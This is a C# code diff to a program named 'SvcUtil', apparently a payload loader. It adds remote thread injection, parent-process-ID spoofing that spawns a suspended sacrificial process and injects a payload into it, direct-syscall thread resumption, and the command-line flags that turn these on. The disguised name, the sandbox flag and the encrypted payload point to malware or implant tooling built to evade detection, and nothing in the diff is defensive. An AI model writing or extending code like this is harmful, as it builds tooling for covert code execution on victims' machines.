@@ -24,6 +24,8 @@ namespace SvcUtil
         private static string _aesPassword;
 #if INJECT
         private static int _targetPid;
+        private static bool _useThreadInject;
+        private static int _ppidSpoof;
 #endif
         private static bool _noSandbox;
 
@@ -44,6 +46,8 @@ namespace SvcUtil
             _aesPassword = null;
 #if INJECT
             _targetPid = 0;
+            _useThreadInject = false;
+            _ppidSpoof = 0;
 #endif
             _noSandbox = false;
 
@@ -82,9 +86,44 @@ namespace SvcUtil
                 {
 #if INJECT
                     if (_targetPid > 0)
-                        RemoteLoader.Inject(_targetPid, payload);
+                    {
+                        // Remote injection — choose method
+                        bool injected;
+                        if (_useThreadInject)
+                            injected = ThreadInjector.Inject(_targetPid, payload);
+                        else
+                            injected = RemoteLoader.Inject(_targetPid, payload);
+
+                        if (!injected)
+                            return;
+                    }
+                    else if (_ppidSpoof > 0)
+                    {
+                        // Spawn sacrificial process under spoofed parent, inject into it
+                        IntPtr hProc, hThread;
+                        int childPid;
+                        if (!PpidSpoof.CreateWithParent(
+                                _command, _ppidSpoof, true,
+                                out hProc, out hThread, out childPid))
+                            return;
+
+                        // Inject into the suspended child
+                        bool injected = _useThreadInject
+                            ? ThreadInjector.Inject(childPid, payload)
+                            : RemoteLoader.Inject(childPid, payload);
+
+                        if (!injected)
+                            return;
+
+                        // Resume the child's main thread
+                        Syscall.NtResumeThread(hThread);
+                        Syscall.NtClose(hThread);
+                        Syscall.NtClose(hProc);
+                    }
                     else
+                    {
                         PayloadRunner.Execute(payload);
+                    }
 #endif
                 }
                 finally
@@ -196,6 +235,22 @@ namespace SvcUtil
                                 _targetPid = procs[0].Id;
                             else
                                 return false; // Process not found
+                        }
+                        break;
+
+                    case "--thread-inject":
+                        _useThreadInject = true;
+                        break;
+
+                    case "--ppid":
+                        if (i + 1 >= args.Length) return false;
+                        string ppArg = args[++i];
+                        if (!int.TryParse(ppArg, out _ppidSpoof))
+                        {
+                            // Treat as process name — find PID
+                            _ppidSpoof = PpidSpoof.FindParentPid(ppArg);
+                            if (_ppidSpoof == 0)
+                                return false;
                         }
                         break;
 #endif
